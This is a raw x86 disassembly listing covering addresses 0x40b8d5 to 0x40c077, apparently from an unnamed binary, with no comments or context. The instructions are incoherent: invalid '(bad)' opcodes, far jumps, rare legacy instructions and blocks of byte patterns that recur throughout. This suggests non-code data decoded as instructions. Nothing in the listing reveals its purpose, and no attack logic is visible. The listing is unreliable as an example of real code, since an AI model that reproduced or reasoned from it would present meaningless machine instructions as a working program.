  40b8d5:	xchg   BYTE PTR [eax+0x41],cl
  40b8d8:	inc    eax
  40b8d9:	add    eax,0x41624340
  40b8de:	test   BYTE PTR [eax],al
  40b8e0:	and    eax,0x404043
  40b8e5:	add    BYTE PTR ds:0x626210,al
  40b8eb:	add    eax,0x43404140
  40b8f0:	inc    eax
  40b8f1:	inc    ecx
  40b8f2:	add    eax,0x10664062
  40b8f7:	inc    ebx
  40b8f8:	bound  eax,QWORD PTR [ebp+0x63]
  40b8fb:	pop    es
  40b8fc:	inc    eax
  40b8fd:	adc    DWORD PTR [edi+0x25],edi
  40b900:	xor    eax,0x40ef2ac0
  40b905:	jmp    0x40b919
  40b907:	add    eax,DWORD PTR [edx+0x34]
  40b90a:	push   0x28
  40b90c:	and    al,0xf6
  40b90e:	pop    ss
  40b90f:	inc    eax
  40b910:	dec    esp
  40b911:	(bad)  
  40b912:	stc    
  40b913:	inc    edx
  40b914:	inc    eax
  40b915:	and    bh,BYTE PTR [esi+0x62cb3d9e]
  40b91b:	or     eax,DWORD PTR [eax+0x43]
  40b91e:	mov    esp,0x4733c3a8
  40b923:	les    eax,FWORD PTR [eax+0x31]
  40b926:	mov    edi,0xece95363
  40b92b:	bound  esp,QWORD PTR [ebx]
  40b92d:	and    al,0x5
  40b92f:	int3   
  40b930:	inc    ecx
  40b931:	inc    eax
  40b932:	add    BYTE PTR [eax],al
  40b934:	add    BYTE PTR [eax+0x40],al
  40b937:	inc    ebx
  40b938:	bound  eax,QWORD PTR [eax]
  40b93a:	inc    eax
  40b93b:	inc    eax
  40b93c:	add    eax,0x62434162
  40b941:	inc    eax
  40b942:	js     0x40b954
  40b944:	inc    ecx
  40b945:	add    eax,0x5404325
  40b94a:	bound  eax,QWORD PTR [eax+0x40]
  40b94d:	inc    ecx
  40b94e:	inc    ebx
  40b94f:	inc    eax
  40b950:	add    eax,0x44b062ab
  40b955:	inc    eax
  40b956:	xor    eax,DWORD PTR [eax-0x7a]
  40b959:	mov    ah,0x54
  40b95b:	add    eax,0x514a4050
  40b960:	and    eax,0x6b5c2405
  40b965:	inc    eax
  40b966:	jo     0x40b9dc
  40b968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b969:	and    eax,0x436241
  40b96e:	adc    BYTE PTR [eax+0x0],al
  40b971:	add    eax,0x62410040
  40b976:	inc    eax
  40b977:	add    BYTE PTR [ebx-0x34],al
  40b97a:	inc    eax
  40b97b:	add    eax,0x78434040
  40b980:	bound  eax,QWORD PTR [ecx+0x78]
  40b983:	add    eax,0x62404043
  40b988:	leave  
  40b989:	cmp    BYTE PTR [esi-0x6fc8dd54],ah
  40b98f:	add    eax,0xb352c3bc
  40b994:	inc    eax
  40b995:	inc    ebx
  40b996:	scas   al,BYTE PTR es:[edi]
  40b997:	xchg   BYTE PTR ds:0x40430c72,al
  40b99d:	xor    BYTE PTR [ecx+0x40],al
  40b9a0:	add    eax,0x43436240
  40b9a5:	add    eax,0x62004040
  40b9aa:	inc    eax
  40b9ab:	add    BYTE PTR [ecx+0x40],al
  40b9ae:	inc    ebx
  40b9af:	test   BYTE PTR ds:0x58054041,ah
  40b9b5:	inc    eax
  40b9b6:	inc    eax
  40b9b7:	bound  eax,QWORD PTR [eax+0x66]
  40b9ba:	inc    ecx
  40b9bb:	inc    eax
  40b9bc:	add    eax,0xcd2c0a00
  40b9c1:	cmp    dh,BYTE PTR [edx+edx*8]
  40b9c4:	inc    eax
  40b9c5:	popf   
  40b9c6:	inc    eax
  40b9c7:	mov    ds:0x8ac86448,eax
  40b9cc:	and    DWORD PTR [eax+ecx*8],esp
  40b9cf:	add    eax,0x7ad6b035
  40b9d4:	inc    eax
  40b9d5:	cmovo  eax,DWORD PTR [esi-0x30d3eabf]
  40b9dc:	inc    eax
  40b9dd:	adc    bh,BYTE PTR [esi+0x25]
  40b9e0:	dec    esp
  40b9e1:	(bad)  
  40b9e2:	(bad)  
  40b9e3:	fiadd  DWORD PTR [eax+0x2f]
  40b9e6:	add    BYTE PTR [eax],al
  40b9e8:	inc    ebx
  40b9e9:	inc    eax
  40b9ea:	bound  eax,QWORD PTR ds:0x25404110
  40b9f0:	add    ah,cl
  40b9f2:	inc    ebx
  40b9f3:	add    eax,0x40402562
  40b9f8:	add    BYTE PTR [eax+0x40],al
  40b9fb:	inc    ecx
  40b9fc:	inc    ecx
  40b9fd:	add    eax,0x78434025
  40ba02:	bound  eax,QWORD PTR [eax-0x7c]
  40ba05:	inc    eax
  40ba06:	inc    ecx
  40ba07:	and    esp,DWORD PTR [edx+0x2866ae50]
  40ba0d:	push   eax
  40ba0e:	inc    edx
  40ba0f:	xchg   ebp,eax
  40ba10:	add    eax,0x427b5340
  40ba15:	inc    eax
  40ba16:	rol    BYTE PTR [ecx-0x7a],cl
  40ba19:	push   cs
  40ba1a:	lds    edi,FWORD PTR [edx+0x582b4005]
  40ba20:	add    al,0x10
  40ba22:	dec    esi
  40ba23:	int    0x94
  40ba25:	inc    eax
  40ba26:	inc    eax
  40ba27:	cmp    DWORD PTR [ecx+0x40],eax
  40ba2a:	inc    eax
  40ba2b:	inc    ebx
  40ba2c:	int3   
  40ba2d:	add    BYTE PTR ds:0x56240,al
  40ba33:	inc    ebx
  40ba34:	inc    eax
  40ba35:	inc    eax
  40ba36:	add    BYTE PTR [ecx+0x62],al
  40ba39:	bound  eax,QWORD PTR [eax]
  40ba3b:	int3   
  40ba3c:	inc    eax
  40ba3d:	inc    ebx
  40ba3e:	add    eax,0x43624041
  40ba43:	adc    BYTE PTR [ecx+0x5],al
  40ba46:	inc    eax
  40ba47:	mov    eax,ds:0x6221e167
  40ba4c:	inc    esp
  40ba4d:	and    edx,DWORD PTR [ecx+0x5]
  40ba50:	inc    eax
  40ba51:	push   edx
  40ba52:	xor    al,0x40
  40ba54:	inc    eax
  40ba55:	imul   esi,DWORD PTR [ecx+0x5049a886],0x30
  40ba5c:	inc    eax
  40ba5d:	adc    ebp,DWORD PTR [eax+0x60]
  40ba60:	add    eax,0x406c26cc
  40ba65:	adc    DWORD PTR [ebx-0x76a87960],esi
  40ba6b:	push   eax
  40ba6c:	inc    ebx
  40ba6d:	inc    edx
  40ba6e:	pop    ebx
  40ba6f:	add    eax,0x430c2414
  40ba74:	inc    eax
  40ba75:	hlt    
  40ba76:	inc    ecx
  40ba77:	xchg   BYTE PTR [edx+0x43],ah
  40ba7a:	inc    eax
  40ba7b:	adc    BYTE PTR ds:0x4158cc40,al
  40ba81:	inc    ebx
  40ba82:	bound  eax,QWORD PTR [ecx+0x40]
  40ba85:	add    eax,0x4140
  40ba8a:	and    eax,0x40400062
  40ba8f:	add    eax,0x84404340
  40ba94:	int3   
  40ba95:	js     0x40ba97
  40ba97:	inc    ecx
  40ba98:	adc    BYTE PTR [edx+0xf],ah
  40ba9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba9c:	xor    al,0x62
  40ba9e:	rol    DWORD PTR [eax+0x22],1
  40baa1:	shl    DWORD PTR ds:0x2c8aa05,cl
  40baa7:	inc    eax
  40baa8:	jl     0x40ba60
  40baaa:	lahf   
  40baab:	xchg   BYTE PTR [edi+0x46],dl
  40baae:	xor    eax,DWORD PTR [edx-0x4f]
  40bab1:	repz add eax,0x4000c613
  40bab7:	inc    ecx
  40bab8:	inc    eax
  40bab9:	inc    ebx
  40baba:	bound  ax,DWORD PTR ds:0x40434100
  40bac1:	add    eax,0x40054062
  40bac6:	bound  eax,QWORD PTR [ecx+0x40]
  40bac9:	inc    ebx
  40baca:	inc    eax
  40bacb:	add    eax,0x25405841
  40bad0:	bound  eax,QWORD PTR [eax+0x43]
  40bad3:	inc    eax
  40bad4:	adc    BYTE PTR [ecx],ch
  40bad6:	cmp    BYTE PTR [eax+0x42],al
  40bad9:	dec    esp
  40bada:	xchg   BYTE PTR [esi+0x406f50de],ah
  40bae0:	xor    dh,BYTE PTR [edx+0x38]
  40bae3:	add    eax,0x40411368
  40bae8:	cmp    eax,0x64869e23
  40baed:	xchg   ebp,eax
  40baee:	inc    ebx
  40baef:	inc    ecx
  40baf0:	inc    ecx
  40baf1:	inc    ecx
  40baf2:	add    eax,0x3063110f
  40baf7:	inc    eax
  40baf8:	shl    BYTE PTR [esi-0x7a],1
  40bafb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bafc:	mov    al,0x44
  40bafe:	ins    BYTE PTR es:[edi],dx
  40baff:	inc    eax
  40bb00:	jnp    0x40bb43
  40bb02:	and    eax,0x402a0d05
  40bb07:	inc    eax
  40bb08:	inc    eax
  40bb09:	jg     0x40bb4b
  40bb0b:	inc    ecx
  40bb0c:	inc    ebx
  40bb0d:	inc    eax
  40bb0e:	add    eax,0x43406262
  40bb13:	inc    ecx
  40bb14:	adc    BYTE PTR [eax],al
  40bb16:	inc    eax
  40bb17:	add    eax,0x43000562
  40bb1c:	add    BYTE PTR [ecx+0x40],al
  40bb1f:	inc    eax
  40bb20:	add    eax,0x400062
  40bb25:	inc    ebx
  40bb26:	inc    eax
  40bb27:	js     0x40bb6a
  40bb29:	inc    ecx
  40bb2a:	bound  eax,QWORD PTR [eax-0x63]
  40bb2d:	xchg   dh,bh
  40bb2f:	int3   
  40bb30:	xor    DWORD PTR [ecx-0xc],eax
  40bb33:	add    al,BYTE PTR ds:0x6c7e6210
  40bb39:	inc    eax
  40bb3a:	cs aas 
  40bb3c:	xchg   BYTE PTR [ecx+edx*4-0x70bf929d],ah
  40bb43:	push   ebx
  40bb44:	bound  eax,QWORD PTR [eax+0x5]
  40bb47:	inc    ecx
  40bb48:	add    BYTE PTR [ebx+0x40],al
  40bb4b:	inc    eax
  40bb4c:	inc    ecx
  40bb4d:	inc    eax
  40bb4e:	inc    eax
  40bb4f:	bound  eax,QWORD PTR ds:0x5624300
  40bb55:	add    BYTE PTR [eax+0x40],al
  40bb58:	add    BYTE PTR [ecx+0x43],al
  40bb5b:	add    BYTE PTR [eax+0x41],al
  40bb5e:	add    eax,0x40436200
  40bb63:	inc    eax
  40bb64:	add    eax,0x6c056e62
  40bb69:	mov    al,0x43
  40bb6b:	inc    eax
  40bb6c:	xchg   ecx,eax
  40bb6d:	lahf   
  40bb6e:	pushf  
  40bb6f:	xchg   BYTE PTR [edx+0x60],ah
  40bb72:	rol    DWORD PTR [ebx+0x3d],1
  40bb75:	scas   eax,DWORD PTR es:[edi]
  40bb76:	add    eax,0x7b051540
  40bb7b:	inc    eax
  40bb7c:	push   ecx
  40bb7d:	push   ebx
  40bb7e:	xchg   BYTE PTR [edi+0x409762cd],bh
  40bb84:	jge    0x40bb25
  40bb86:	cs add eax,0x40a12ae5
  40bb8c:	push   ecx
  40bb8d:	add    eax,0x3cae869b
  40bb92:	cmp    eax,DWORD PTR [eax+0x6f]
  40bb95:	xor    BYTE PTR ds:0x41626214,al
  40bb9b:	xor    BYTE PTR [ecx+0x40],al
  40bb9e:	add    eax,0x41624340
  40bba3:	test   BYTE PTR [eax],al
  40bba5:	and    eax,0x404043
  40bbaa:	add    BYTE PTR ds:0x626210,al
  40bbb0:	add    eax,0x43404140
  40bbb5:	inc    eax
  40bbb6:	inc    ecx
  40bbb7:	add    eax,0x10664062
  40bbbc:	inc    ebx
  40bbbd:	bound  edx,QWORD PTR [ecx+0x50]
  40bbc0:	xchg   BYTE PTR [esi-0x15b84fe7],bh
  40bbc6:	and    DWORD PTR [edi],ecx
  40bbc8:	sub    DWORD PTR ds:0x74240520,eax
  40bbce:	aam    0x4e
  40bbd0:	call   0x41cc:0x5876786
  40bbd7:	inc    eax
  40bbd8:	add    BYTE PTR [eax],al
  40bbda:	add    BYTE PTR [eax+0x40],al
  40bbdd:	inc    ebx
  40bbde:	bound  eax,QWORD PTR [eax]
  40bbe0:	inc    eax
  40bbe1:	inc    eax
  40bbe2:	add    eax,0x62434162
  40bbe7:	inc    eax
  40bbe8:	js     0x40bbfa
  40bbea:	inc    ecx
  40bbeb:	add    eax,0x5404325
  40bbf0:	bound  eax,QWORD PTR [eax+0x40]
  40bbf3:	inc    ecx
  40bbf4:	inc    ebx
  40bbf5:	push   0x5f03bfd
  40bbfa:	add    eax,0xf740f47b
  40bbff:	push   ebp
  40bc00:	xchg   BYTE PTR gs:[ebp-0x35ce642c],bh
  40bc07:	shr    DWORD PTR [ebp+0x2d],1
  40bc0a:	add    eax,0x806c4eff
  40bc0f:	cmp    eax,0x15869937
  40bc14:	pop    eax
  40bc15:	or     cl,BYTE PTR [ecx+0x41]
  40bc18:	ins    DWORD PTR es:[edi],dx
  40bc19:	add    eax,0x4352d907
  40bc1e:	jno    0x40bc78
  40bc20:	aas    
  40bc21:	and    eax,0x436241
  40bc26:	adc    BYTE PTR [eax+0x0],al
  40bc29:	add    eax,0x62410040
  40bc2e:	inc    eax
  40bc2f:	add    BYTE PTR [ebx-0x34],al
  40bc32:	inc    eax
  40bc33:	add    eax,0x78434040
  40bc38:	bound  eax,QWORD PTR [ecx+0x78]
  40bc3b:	add    eax,0x62404043
  40bc40:	xchg   BYTE PTR [esi+eax*4+0x39ecd149],bh
  40bc47:	jmp    0x40bc6d
  40bc49:	add    eax,0x57e3852
  40bc4e:	pusha  
  40bc4f:	push   esp
  40bc50:	cwde   
  40bc51:	xchg   BYTE PTR [eax-0x70],ch
  40bc54:	pop    ss
  40bc55:	dec    ecx
  40bc56:	icebp  
  40bc57:	inc    DWORD PTR ds:0x8cbf3052
  40bc5d:	mov    DWORD PTR [ebx+0x54],0x9caf4086
  40bc64:	cli    
  40bc65:	add    dl,BYTE PTR [ebx]
  40bc67:	inc    DWORD PTR [ecx+0x40]
  40bc6a:	add    eax,0x43436240
  40bc6f:	add    eax,0x62004040
  40bc74:	inc    eax
  40bc75:	add    BYTE PTR [ecx+0x40],al
  40bc78:	inc    ebx
  40bc79:	test   BYTE PTR ds:0x58054041,ah
  40bc7f:	inc    eax
  40bc80:	inc    eax
  40bc81:	bound  eax,QWORD PTR [eax+0x66]
  40bc84:	inc    ecx
  40bc85:	inc    eax
  40bc86:	add    eax,0xca162100
  40bc8b:	push   esi
  40bc8c:	sub    BYTE PTR [esi+0x6c975442],bh
  40bc92:	xor    DWORD PTR [edx+0x42],esp
  40bc95:	inc    ecx
  40bc96:	ja     0x40bc97
  40bc98:	add    eax,0x66c06462
  40bc9d:	inc    eax
  40bc9e:	jne    0x40bcf4
  40bca0:	xchg   BYTE PTR [eax],al
  40bca2:	add    BYTE PTR [ebx+0x40],al
  40bca5:	bound  eax,QWORD PTR ds:0x25404110
  40bcab:	add    ah,cl
  40bcad:	inc    ebx
  40bcae:	add    eax,0x40402562
  40bcb3:	add    BYTE PTR [eax+0x40],al
  40bcb6:	inc    ecx
  40bcb7:	inc    ecx
  40bcb8:	add    eax,0x78434025
  40bcbd:	bound  eax,QWORD PTR [eax-0x7c]
  40bcc0:	inc    eax
  40bcc1:	inc    ecx
  40bcc2:	test   eax,0x408844a8
  40bcc7:	jno    0x40bcc8
  40bcc9:	xor    edi,DWORD PTR [eax+0x4062293d]
  40bccf:	inc    edx
  40bcd0:	xchg   ebx,eax
  40bcd1:	xchg   esi,eax
  40bcd2:	or     eax,0x4c4003c1
  40bcd7:	push   eax
  40bcd8:	xor    al,0x41
  40bcda:	inc    eax
  40bcdb:	inc    eax
  40bcdc:	inc    ebx
  40bcdd:	int3   
  40bcde:	add    BYTE PTR ds:0x56240,al
  40bce4:	inc    ebx
  40bce5:	inc    eax
  40bce6:	inc    eax
  40bce7:	add    BYTE PTR [ecx+0x62],al
  40bcea:	bound  eax,QWORD PTR [eax]
  40bcec:	int3   
  40bced:	inc    eax
  40bcee:	inc    ebx
  40bcef:	add    eax,0x43624041
  40bcf4:	adc    BYTE PTR [ecx+0x5],al
  40bcf7:	inc    eax
  40bcf8:	add    eax,0x30a8a816
  40bcfd:	inc    eax
  40bcfe:	sub    al,0x26
  40bd00:	xchg   BYTE PTR [ebx+0x41],ah
  40bd03:	adc    ch,BYTE PTR [eax+eax*2-0x2]
  40bd07:	dec    ebx
  40bd08:	xor    edx,DWORD PTR [edx+ebx*2+0x7c]
  40bd0c:	daa    
  40bd0d:	inc    eax
  40bd0e:	dec    edx
  40bd0f:	mov    al,0x95
  40bd11:	inc    ecx
  40bd12:	cmp    BYTE PTR [edx+0x43],ah
  40bd15:	inc    eax
  40bd16:	adc    BYTE PTR ds:0x4158cc40,al
  40bd1c:	inc    ebx
  40bd1d:	bound  eax,QWORD PTR [ecx+0x40]
  40bd20:	add    eax,0x4140
  40bd25:	and    eax,0x40400062
  40bd2a:	add    eax,0x84404340
  40bd2f:	int3   
  40bd30:	js     0x40bd32
  40bd32:	inc    ecx
  40bd33:	adc    BYTE PTR [edx+0xf],ah
  40bd36:	add    eax,DWORD PTR [ebx+0x58]
  40bd39:	mov    dl,0xb6
  40bd3b:	add    eax,0xd1676dfd
  40bd40:	inc    eax
  40bd41:	pop    ss
  40bd42:	mov    edx,0xac306786
  40bd47:	and    DWORD PTR [eax+0x6e],eax
  40bd4a:	push   edx
  40bd4b:	ss pop ebx
  40bd4d:	shl    BYTE PTR [edx+eiz*4],0x40
  40bd51:	jb     0x40bce5
  40bd53:	xchg   esp,eax
  40bd54:	add    BYTE PTR [eax+0x41],al
  40bd57:	inc    eax
  40bd58:	inc    ebx
  40bd59:	bound  ax,DWORD PTR ds:0x40434100
  40bd60:	add    eax,0x40054062
  40bd65:	bound  eax,QWORD PTR [ecx+0x40]
  40bd68:	inc    ebx
  40bd69:	inc    eax
  40bd6a:	add    eax,0x25405841
  40bd6f:	bound  eax,QWORD PTR [eax+0x43]
  40bd72:	inc    eax
  40bd73:	adc    ah,bl
  40bd75:	inc    esp
  40bd76:	inc    BYTE PTR [esp+edx*2+0x30]
  40bd7a:	sub    eax,DWORD PTR ds:0xcfc035c8
  40bd80:	inc    eax
  40bd81:	push   0x57
  40bd83:	xchg   BYTE PTR [eax+0x40416276],bl
  40bd89:	shl    BYTE PTR [ecx],1
  40bd8b:	je     0x40bdf1
  40bd8d:	test   al,0xc4
  40bd8f:	inc    ebx
  40bd90:	inc    eax
  40bd91:	xor    al,BYTE PTR [eax+0x41]
  40bd94:	inc    ebx
  40bd95:	inc    eax
  40bd96:	add    eax,0x43406262
  40bd9b:	inc    ecx
  40bd9c:	adc    BYTE PTR [eax],al
  40bd9e:	inc    eax
  40bd9f:	add    eax,0x43000562
  40bda4:	add    BYTE PTR [ecx+0x40],al
  40bda7:	inc    eax
  40bda8:	add    eax,0x400062
  40bdad:	inc    ebx
  40bdae:	inc    eax
  40bdaf:	js     0x40bdf2
  40bdb1:	inc    ecx
  40bdb2:	bound  eax,QWORD PTR [eax+0x42]
  40bdb5:	inc    eax
  40bdb6:	dec    ebp
  40bdb7:	adc    cl,BYTE PTR [edi+0x30]
  40bdba:	push   eax
  40bdbb:	inc    ebx
  40bdbc:	adc    edx,DWORD PTR [esi-0x23]
  40bdbf:	dec    eax
  40bdc0:	nop
  40bdc1:	pusha  
  40bdc2:	inc    eax
  40bdc3:	rcl    BYTE PTR [edx+0x34],1
  40bdc6:	inc    ecx
  40bdc7:	inc    ecx
  40bdc8:	cmp    al,BYTE PTR [eax+0x40]
  40bdcb:	jle    0x40bd5d
  40bdcd:	push   0x62
  40bdcf:	inc    eax
  40bdd0:	add    eax,0x40430041
  40bdd5:	inc    eax
  40bdd6:	inc    ecx
  40bdd7:	inc    eax
  40bdd8:	inc    eax
  40bdd9:	bound  eax,QWORD PTR ds:0x5624300
  40bddf:	add    BYTE PTR [eax+0x40],al
  40bde2:	add    BYTE PTR [ecx+0x43],al
  40bde5:	add    BYTE PTR [eax+0x41],al
  40bde8:	add    eax,0x40436200
  40bded:	inc    eax
  40bdee:	add    eax,0x9bc78462
  40bdf3:	xor    DWORD PTR [eax-0x16],eax
  40bdf6:	and    eax,0xbca8792c
  40bdfb:	ins    BYTE PTR es:[edi],dx
  40bdfc:	dec    esp
  40bdfd:	jns    0x40be41
  40bdff:	push   ebx
  40be00:	and    BYTE PTR [ebx+0x62],ah
  40be03:	les    eax,FWORD PTR [eax-0xe]
  40be06:	mov    edi,0xd09b6887
  40be0b:	inc    ebx
  40be0c:	inc    eax
  40be0d:	xor    al,0x49
  40be0f:	inc    eax
  40be10:	mov    WORD PTR fs:[ebp-0x2f],es
  40be14:	inc    eax
  40be15:	inc    esp
  40be16:	xchg   ebx,eax
  40be17:	inc    ecx
  40be18:	inc    eax
  40be19:	add    eax,0x41624340
  40be1e:	test   BYTE PTR [eax],al
  40be20:	and    eax,0x404043
  40be25:	add    BYTE PTR ds:0x626210,al
  40be2b:	add    eax,0x43404140
  40be30:	inc    eax
  40be31:	inc    ecx
  40be32:	add    eax,0x10664062
  40be37:	inc    ebx
  40be38:	bound  eax,QWORD PTR [eax+0x5]
  40be3b:	arpl   WORD PTR ds:0xfb724853,bp
  40be41:	inc    ebx
  40be42:	inc    ecx
  40be43:	fsub   DWORD PTR [esi]
  40be45:	jg     0x40be87
  40be47:	jl     0x40be8b
  40be49:	dec    eax
  40be4a:	test   esp,edx
  40be4c:	sub    dl,bl
  40be4e:	inc    eax
  40be4f:	inc    ecx
  40be50:	xor    eax,0x4041cc05
  40be55:	add    BYTE PTR [eax],al
  40be57:	add    BYTE PTR [eax+0x40],al
  40be5a:	inc    ebx
  40be5b:	bound  eax,QWORD PTR [eax]
  40be5d:	inc    eax
  40be5e:	inc    eax
  40be5f:	add    eax,0x62434162
  40be64:	inc    eax
  40be65:	js     0x40be77
  40be67:	inc    ecx
  40be68:	add    eax,0x5404325
  40be6d:	bound  eax,QWORD PTR [eax+0x40]
  40be70:	inc    ecx
  40be71:	inc    ebx
  40be72:	inc    edx
  40be73:	push   0x40572164
  40be78:	rol    BYTE PTR [ecx+esi*1-0x6e],cl
  40be7c:	jns    0x40bee1
  40be7e:	inc    ecx
  40be7f:	inc    esp
  40be80:	jle    0x40be93
  40be82:	mov    esp,0x435dd84e
  40be87:	inc    eax
  40be88:	jo     0x40becd
  40be8a:	arpl   WORD PTR ds:0x48302063,sp
  40be90:	(bad)  
  40be91:	ror    eax,cl
  40be93:	and    al,0x98
  40be95:	ds pop esp
  40be97:	inc    eax
  40be98:	jl     0x40bedc
  40be9a:	fmul   DWORD PTR ds:0x40403420
  40bea0:	jmp    0x1000:0x43624125
  40bea7:	inc    eax
  40bea8:	add    BYTE PTR ds:0x62410040,al
  40beae:	inc    eax
  40beaf:	add    BYTE PTR [ebx-0x34],al
  40beb2:	inc    eax
  40beb3:	add    eax,0x78434040
  40beb8:	bound  eax,QWORD PTR [ecx+0x78]
  40bebb:	add    eax,0x62404043
  40bec0:	mov    cl,0x63
  40bec2:	and    DWORD PTR [edi+0x2e],esp
  40bec5:	xor    DWORD PTR [eax-0x42],eax
  40bec8:	push   eax
  40bec9:	inc    ecx
  40beca:	bound  eax,QWORD PTR [esi-0x1c]
  40becd:	ins    BYTE PTR es:[edi],dx
  40bece:	inc    eax
  40becf:	mov    edi,0x3871e4bf
  40bed4:	inc    ecx
  40bed5:	inc    eax
  40bed6:	add    eax,0x43436240
  40bedb:	add    eax,0x62004040
  40bee0:	inc    eax
  40bee1:	add    BYTE PTR [ecx+0x40],al
  40bee4:	inc    ebx
  40bee5:	test   BYTE PTR ds:0x58054041,ah
  40beeb:	inc    eax
  40beec:	inc    eax
  40beed:	bound  eax,QWORD PTR [eax+0x66]
  40bef0:	inc    ecx
  40bef1:	inc    eax
  40bef2:	add    eax,0x40e16200
  40bef7:	inc    eax
  40bef8:	inc    eax
  40bef9:	mov    ah,ah
  40befb:	sbb    al,0x3e
  40befd:	dec    edx
  40befe:	inc    eax
  40beff:	inc    eax
  40bf00:	xor    ebp,DWORD PTR [eax-0x267b5758]
  40bf06:	inc    eax
  40bf07:	pop    edi
  40bf08:	add    BYTE PTR [eax],al
  40bf0a:	inc    ebx
  40bf0b:	inc    eax
  40bf0c:	bound  eax,QWORD PTR ds:0x25404110
  40bf12:	add    ah,cl
  40bf14:	inc    ebx
  40bf15:	add    eax,0x40402562
  40bf1a:	add    BYTE PTR [eax+0x40],al
  40bf1d:	inc    ecx
  40bf1e:	inc    ecx
  40bf1f:	add    eax,0x78434025
  40bf24:	bound  eax,QWORD PTR [eax-0x7c]
  40bf27:	inc    eax
  40bf28:	inc    ecx
  40bf29:	ja     0x40bf71
  40bf2b:	adc    ecx,eax
  40bf2d:	data16 or al,0x40
  40bf30:	mov    ds,WORD PTR [ebx-0x3b9b3bf]
  40bf36:	retf   0x3440
  40bf39:	add    DWORD PTR [edi+0x1b62620d],0x40
  40bf40:	ins    BYTE PTR es:[edi],dx
  40bf41:	mov    ah,0x92
  40bf43:	retf   
  40bf44:	ins    BYTE PTR es:[edi],dx
  40bf45:	loop   0x40bfa9
  40bf47:	fild   DWORD PTR [eax-0x41]
  40bf4a:	test   al,0x44
  40bf4c:	xor    al,0x28
  40bf4e:	inc    ecx
  40bf4f:	cmc    
  40bf50:	cld    
  40bf51:	push   0x40404145
  40bf56:	inc    ebx
  40bf57:	int3   
  40bf58:	add    BYTE PTR ds:0x56240,al
  40bf5e:	inc    ebx
  40bf5f:	inc    eax
  40bf60:	inc    eax
  40bf61:	add    BYTE PTR [ecx+0x62],al
  40bf64:	bound  eax,QWORD PTR [eax]
  40bf66:	int3   
  40bf67:	inc    eax
  40bf68:	inc    ebx
  40bf69:	add    eax,0x43624041
  40bf6e:	adc    BYTE PTR [ecx+0x5],al
  40bf71:	inc    eax
  40bf72:	jecxz  0x40bf91
  40bf74:	xchg   ecx,eax
  40bf75:	inc    ebx
  40bf76:	xor    BYTE PTR [edi+0x78304125],0xbf
  40bf7d:	xor    bh,ah
  40bf7f:	push   es
  40bf80:	jae    0x40bf09
  40bf82:	dec    esi
  40bf83:	pop    edx
  40bf84:	inc    eax
  40bf85:	pop    eax
  40bf86:	inc    edi
  40bf87:	ja     0x40bfcd
  40bf89:	pushf  
  40bf8a:	cmp    ah,al
  40bf8c:	inc    eax
  40bf8d:	inc    eax
  40bf8e:	retf   
  40bf8f:	dec    ecx
  40bf90:	jo     0x40bf3a
  40bf92:	les    ecx,FWORD PTR [edi+0x42]
  40bf95:	xor    DWORD PTR [esi],edi
  40bf97:	nop
  40bf98:	add    eax,DWORD PTR [eax+eax*2+0x40]
  40bf9c:	pusha  
  40bf9d:	ins    BYTE PTR es:[edi],dx
  40bf9e:	dec    ecx
  40bf9f:	add    al,0x41
  40bfa1:	sub    al,BYTE PTR [ebx+0x48]
  40bfa4:	inc    ebx
  40bfa5:	(bad)  
  40bfa6:	jecxz  0x40bfe8
  40bfa8:	rol    DWORD PTR [edx+eiz*2+0x43],1
  40bfac:	inc    eax
  40bfad:	adc    BYTE PTR ds:0x4158cc40,al
  40bfb3:	inc    ebx
  40bfb4:	bound  eax,QWORD PTR [ecx+0x40]
  40bfb7:	add    eax,0x4140
  40bfbc:	and    eax,0x40400062
  40bfc1:	add    eax,0x84404340
  40bfc6:	int3   
  40bfc7:	js     0x40bfc9
  40bfc9:	inc    ecx
  40bfca:	adc    BYTE PTR [edx+0xf],ah
  40bfcd:	inc    eax
  40bfce:	inc    ecx
  40bfcf:	jne    0x40bfc1
  40bfd1:	jge    0x40bf63
  40bfd3:	dec    esi
  40bfd4:	inc    edx
  40bfd5:	sub    BYTE PTR [ebp+0x348f510],cl
  40bfdb:	xor    esi,edi
  40bfdd:	inc    eax
  40bfde:	mov    esp,0x4a2aeb62
  40bfe3:	dec    esi
  40bfe4:	les    ebp,FWORD PTR [edx]
  40bfe6:	push   0x7bbfb3f8
  40bfeb:	aas    
  40bfec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfed:	jnp    0x40c054
  40bfef:	sar    BYTE PTR [edx+0x63],cl
  40bff2:	add    BYTE PTR [eax+0x41],al
  40bff5:	inc    eax
  40bff6:	inc    ebx
  40bff7:	bound  ax,DWORD PTR ds:0x40434100
  40bffe:	add    eax,0x40054062
  40c003:	bound  eax,QWORD PTR [ecx+0x40]
  40c006:	inc    ebx
  40c007:	inc    eax
  40c008:	add    eax,0x25405841
  40c00d:	bound  eax,QWORD PTR [eax+0x43]
  40c010:	inc    eax
  40c011:	adc    BYTE PTR [ebp+0x4e],dh
  40c014:	test   al,0x45
  40c016:	fsubr  QWORD PTR [eax-0x2cbe94bd]
  40c01c:	inc    ecx
  40c01d:	adc    eax,0x71331066
  40c022:	aaa    
  40c023:	das    
  40c024:	sub    ah,BYTE PTR [eax+eiz*1-0x54]
  40c028:	push   esp
  40c029:	xor    cl,dl
  40c02b:	dec    esi
  40c02c:	lods   al,BYTE PTR ds:[esi]
  40c02d:	arpl   WORD PTR [edx+eax*2],sp
  40c030:	inc    eax
  40c031:	xchg   esp,eax
  40c032:	inc    eax
  40c033:	inc    ecx
  40c034:	inc    ebx
  40c035:	inc    eax
  40c036:	add    eax,0x43406262
  40c03b:	inc    ecx
  40c03c:	adc    BYTE PTR [eax],al
  40c03e:	inc    eax
  40c03f:	add    eax,0x43000562
  40c044:	add    BYTE PTR [ecx+0x40],al
  40c047:	inc    eax
  40c048:	add    eax,0x400062
  40c04d:	inc    ebx
  40c04e:	inc    eax
  40c04f:	js     0x40c092
  40c051:	inc    ecx
  40c052:	bound  eax,QWORD PTR [eax+0x14]
  40c055:	(bad)  
  40c057:	add    al,0xb0
  40c059:	addr16 xor eax,eax
  40c05c:	push   0x43f0154e
  40c061:	and    al,0x6c
  40c063:	repz push ebp
  40c065:	fild   WORD PTR [edx+ebp*2+0x50]
  40c069:	bound  ebx,QWORD PTR [ebx+0x40625362]
  40c06f:	add    eax,0x40430041
  40c074:	inc    eax
  40c075:	inc    ecx
  40c076:	inc    eax
  40c077:	inc    eax
